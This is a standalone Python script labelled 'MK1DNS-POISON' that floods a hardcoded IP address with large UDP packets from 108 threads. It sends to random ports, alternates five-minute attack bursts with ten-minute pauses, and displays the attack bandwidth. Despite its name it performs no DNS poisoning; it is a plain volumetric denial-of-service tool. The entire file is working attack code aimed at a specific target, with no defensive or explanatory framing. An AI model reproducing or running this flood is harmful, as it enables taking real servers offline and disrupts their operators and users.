import socket
import threading
import time
import random

target = "162.0.217.103"
MIN_THREADS = 108  # 2x54

# Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# HIGH BANDWIDTH PAYLOADS (NO PACKET COUNT, JUST BIG DATA)
VIRUS_PAYLOADS = [
    b'\xDE\xAD\xBE\xEF' * 4096,  # 16KB
    b'\x00' * 8192,  # 8KB
    b'\xFF' * 16384,  # 16KB
    b'\xAA\x55\xCC\x33' * 8192,  # 32KB
    b'\x80' * 32768,  # 32KB
    b'\x7F' * 65536,  # 64KB
    random.randbytes(65536),  # 64KB random
]

# Cooldown system - DECLARE GLOBALS FIRST
attack_active = True
cycle_start = time.time()
next_cooldown = cycle_start + 300  # 5 minutes attacking initially
COOLDOWN_TIME = 600  # 10 minutes resting
ATTACK_CYCLE = 300   # 5 minutes attacking

# Bandwidth stats
total_bytes = 0
start_time = time.time()

def virus_attack(thread_id):
    global total_bytes
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        current_time = time.time()
        
        # Check cooldown state WITHOUT GLOBAL DECLARATION INSIDE LOOP
        if current_time >= next_cooldown:
            # Use function to handle state change
            handle_state_change(current_time)
        
        # Only send if attack is active
        if attack_active:
            try:
                # MAX BANDWIDTH - SEND HUGE PACKETS
                payload = random.choice(VIRUS_PAYLOADS)
                port = random.randint(1, 65535)
                
                sock.sendto(payload, (target, port))
                total_bytes += len(payload)
                
            except:
                try:
                    sock.close()
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                except:
                    pass
        else:
            # DEEP SLEEP during cooldown
            time.sleep(0.5)

def handle_state_change(current_time):
    global attack_active, cycle_start, next_cooldown
    
    if attack_active:
        # Enter cooldown
        attack_active = False
        cycle_start = current_time
        next_cooldown = current_time + COOLDOWN_TIME
        print(f"\n{YELLOW}[COOLDOWN ACTIVE] Resting for 10 minutes{RESET}")
    else:
        # Resume attack
        attack_active = True
        cycle_start = current_time
        next_cooldown = current_time + ATTACK_CYCLE
        print(f"\n{GREEN}[ATTACK RESUMED] Firing for 5 minutes{RESET}")

# Launch threads
print(f"{RED}MK1DNS-POISON{RESET} | Target: {target}")
print(f"{GREEN}Starting {MIN_THREADS} bandwidth threads...{RESET}")
print(f"{CYAN}Cooldown: {ATTACK_CYCLE//60}min attack → {COOLDOWN_TIME//60}min rest{RESET}")
print(f"{MAGENTA}Payload size: 8KB - 64KB{RESET}")

for i in range(MIN_THREADS):
    t = threading.Thread(target=virus_attack, args=(i,))
    t.daemon = True
    t.start()

# Status display
last_display = 0
while True:
    time.sleep(1)
    
    current_time = time.time()
    elapsed_total = current_time - start_time
    
    # Update display every 5 seconds
    if current_time - last_display >= 5:
        # Calculate bandwidth (Mbps)
        if elapsed_total > 0:
            mbps = (total_bytes * 8) / (elapsed_total * 1_000_000)
        else:
            mbps = 0
        
        # Time remaining in current state
        time_left = max(0, next_cooldown - current_time)
        minutes = int(time_left // 60)
        seconds = int(time_left % 60)
        
        if attack_active:
            state_color = GREEN
            state_text = "ATTACKING"
            bw_color = RED
        else:
            state_color = YELLOW
            state_text = "COOLDOWN"
            bw_color = YELLOW
        
        print(f"{RED}MK1DNS-POISON{RESET}:{bw_color}{mbps:.1f}Mbps{RESET} | "
              f"{state_color}{state_text} {minutes:02d}:{seconds:02d}{RESET}")
        
        last_display = current_time
    
    # Reset stats every minute
    if elapsed_total >= 60:
        total_bytes = 0
        start_time = time.time()
